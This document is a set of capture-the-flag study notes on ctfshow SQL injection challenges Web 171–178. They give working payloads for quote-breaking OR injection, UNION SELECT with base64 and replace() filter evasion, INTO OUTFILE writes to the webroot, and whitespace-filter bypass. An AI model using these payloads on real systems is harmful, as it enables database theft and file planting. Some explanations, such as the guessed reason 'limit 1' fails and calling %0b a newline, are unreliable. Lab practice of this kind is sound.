# Web 171
![[Pasted image 20241214102338.png]]
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

```SQL
select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;
```
## Observation
PHP code is : `$sql = "xxxxx".$_GET['id']."yyyy"`
- `xxxxx`: `select username,password from user where username !='flag' and id = '`
- `yyyy`: `' limit 1; `
When we do search in this page:
- If username is not flag, and the user ID is not what we provide, the records will be displayed.
- Limit will be executed at last.
## Research

This is a typical ==string== **SQL Injection**.
- Try to use `'` to match the `'` in the string before `$_GET['id']`, so we use `{number}'`.
- Then we also need to match the `'` in the string after `$_GET['id']`, so we use `or username = 'flag`
## Experiment
![[Pasted image 20241216201104.png]]

**Why `limit 1` is invalid?** 
Guess:
- 在分布式数据库（如某些 MySQL 集群版本）中，`LIMIT` 的应用可能被推迟到查询的最终合并阶段，导致在本地节点看到多条记录。
- 某些数据库引擎（如 MySQL）可能会因为缓存问题返回过多的记录。这种情况在高并发查询时容易发生。

# Web 172
![[Pasted image 20241218062030.png]]
Use the same trick, the password says: `flag_not_here`.
![[Pasted image 20241218062133.png]]
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
But the returning logic:
```PHP
//检查结果是否有flag
if($row->username!=='flag'){
  $ret['msg']='查询成功';
}
```
This filters the record whose username is "flag".
## Research
So we need to avoid this filter by using Base64 coding.
### `TO_BASE64()` Method in MySQL
In the standard SQL, there is no Base64 encoding method.
However, there is `TO_BASE64()` method in MySQL and `encode()` in PostgreSQL.
### UNION SQL Injection
When in string SQL injection point, we also can use UNION method.
- Close the `'` before;
- then follow a new `SELECT` with `UNION`.
## Experiment
use:
```SQL
1' union select to_base64(username), to_base64(password) from ctfshow_user2 where username = 'flag' -- 
```
![[Pasted image 20241218063217.png]]
We can decode the password.

![[Pasted image 20241218064420.png]]

## Another Way
```SQL
select username, password from ctfshow_user2 where username != 'flag' and id = '9999' union select username, password from ctfshow_user2 where username = 'flag' limit 1;
```
to
```SQL
select username, password from ctfshow_user2 where username != 'flag' and id = '9999' union select id, password from ctfshow_user2 where username = 'flag' limit 1;
```

Change username to ID, so that avoiding the condition.

![[Pasted image 20241219064028.png]]
# Web 173
![[Pasted image 20241219064644.png]]
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
The condition of returning is:
```PHP
//检查结果是否有flag
if(!preg_match('/flag/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```
## Analysis
If we don't show the username in the returning record, the condition can be avoided.
[[#Another Way]]
```SQL
select id, username, password from ctfshow_user3 where username != 'flag' and id = '999' union select id, id, password from ctfshow_user3 where username = 'flag' limit 1;
```
## Experiment
Local Test:
![[Pasted image 20241219065519.png]]
The real test:
![[Pasted image 20241219065623.png]]

# Web 174
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
The SQL in it is:
```SQL
select id, username, password from ctfshow_user4 where username != 'flag' and id = '???' limit 1;
```
 Condition:
```PHP
//检查结果是否有flag
if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```
The return records cannot include numbers.
## Research
### `json_encode`
In PHP
`json_encode()` convert PHP variables to JSON strings.
#### 数据序列化
In PHP, the datatype, such as array, object, string, numbers, boolean, etc.
convert JSON format strings, so that the strings can transmit or store among different systems or apps.
e.g.:
```php
$data = array('name' => 'John', 'age' => 30, 'city' => 'New York'); $jsonData = json_encode($data); echo $jsonData; 
``` 
The code above convert an array to JSON strings:
`{"name":"John","age":"30","city":"New York"}`
#### Interaction with JavaScript
JSON is the common data format in JavaScript.
```php
<?php 
$data = array('message' => 'Hello from PHP!'); 
$jsonData = json_encode($data); 
?> 
<script> 
var data = <?php echo $jsonData;?>; 
console.log(data.message); 
</script> 
``` 
#### API Development
When developing Web API, we need to convert data to JSON data to return message to client.
`json_encode()` can convert PHP data into JSON format, so that the client can analyze it and explain it.
#### Data Storage
JSON format strings can be stored in Dataset or Files.
When we access the strings, we can use corresponding function to convert JSON strings back to PHP data type.
## Hypothesis
- `to_base64` may also include numbers.
- A stupid solution is to replace the numbers with the signs in numeric area of keyboard. (A long replace code in SQL.)
	- `1->!`
	- `2->@`
	- `3->#`
	- ...
## Experiment
### Local Test
#### `replace`
![[Pasted image 20241221094901.png]]
![[Pasted image 20241221094942.png]]
#### Try Locally
```SQL
select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag' limit 1;
```
![[Pasted image 20241221102227.png]]
```
mysql> select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', password from ctfshow_user4 where username = 'flag' limit 1;

+----+----------+------------+

| id | username | password |

+----+----------+------------+

| a | AAAA | a1b2c3d4e5 |

+----+----------+------------+

1 row in set (0.01 sec)
```

```
mysql> select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag' limit 1;

+----+----------+------------+

| id | username | password |

+----+----------+------------+

| a | AAAA | a!b@c#d$e% |

+----+----------+------------+

1 row in set (0.01 sec)
```
#### Try Online
![[Pasted image 20241221103330.png]]
When we use the completed code to execute searching, we can't get the result:
```
999' union select 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag
```
![[Pasted image 20241221105315.png]]
We can decode the URL code:
![[Pasted image 20241221105418.png]]
It's not completed!!!!
So we need BurpSuite to send the completed command.
![[Pasted image 20241221105534.png]]
![[Pasted image 20241221105605.png]]
Okay, we got it!
![[Pasted image 20241221105631.png]]
Then the flag is as follows:
```
ctfshow{^df$e^^c-$$$^-$d)(-(#e^-!e!)!bd*!bc$}"}
```
Then we need to replace the characters:
```
ctfshow{6df4e66c-4446-4d09-93e6-1e101bd81bc4}
```
# Web 175
![[Pasted image 20241225073835.png]]
## Observation
Searching Sentence:
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
SQL part:
```SQL
select username, password from ctfshow_user5 where username != 'flag' and id = '????' limit 1;
```
Return Logic:
```PHP
//检查结果是否有flag
if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```
## Analysis
The returned result can't be the numbers from 0 to $7\times16^1 + 15$.
## Hypothesis
We still can use `replace`.
![[Pasted image 20241225075416.png]]
Invalid.
## Research
- `[\x00-\x7f]` : The expression describes a set of characters. `\x00` means `NULL`, `\x7f` means `DELETE`. The set include the whole ASCII character set.
- `/i` : this means the Regular Expression is case-insensitive.
## Hypothesis
Nothing can be returned when the PHP code uses the function `preg_match`.
So we only can output the records to file.
### `into outfile` in `MySQL`
MySQL offers `INTO OUTFILE`, which can write the records we have researched into files in servers.
```SQL
SELECT * FROM your_table INTO OUTFILE '/path/to/output.txt'
```
Note: If we use `INTO OUTFILE`, we need writing rights of the files firstly.
## Experiment
```
select username, password from ctfshow_user5 where username != 'flag' and id = '999' union select username, password from ctfshow_user5 into outfile '/var/www/html/flag1.php' # 'limit 1;
```
![[Pasted image 20241225151726.png]]
![[Pasted image 20241225151747.png]]
![[Pasted image 20241225151818.png]]
Note: I recommend that we use Burp Suite to track what we have sent to Server.
If we directly use the input component to input the `#` at the tail of our command, the `%23` will be ignored in the GET request.

# Web 176
```PHP
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

```SQL
select id,username,password from ctfshow_user where username !='flag' and id = '???' limit 1;
```

## Solution
- close the `id='`
	- `id='999'`
- find the target with `username='flag'`
```SQL
select id, username, password from ctfshow_user where username != 'flag' and id = '999' or username = 'flag' limit 1;
```
![[Pasted image 20250124090506.png]]
# Web 177
```SQL
select id,username,password from ctfshow_user where username !='flag' and id = '???' limit 1;
```
But:
![[Pasted image 20250124091332.png]]
The filter works.
- Firstly, try to remove all space.
	- `999'or%0busername='flag`
	- `%0b` means new line or Enter.
![[Pasted image 20250124093259.png]]
# Web 178
Same as [[#Web 177]]
- Firstly, try to remove all space.
	- `999'or%0busername='flag`
	- `%0b` means new line or Enter.
![[Pasted image 20250124102029.png]]
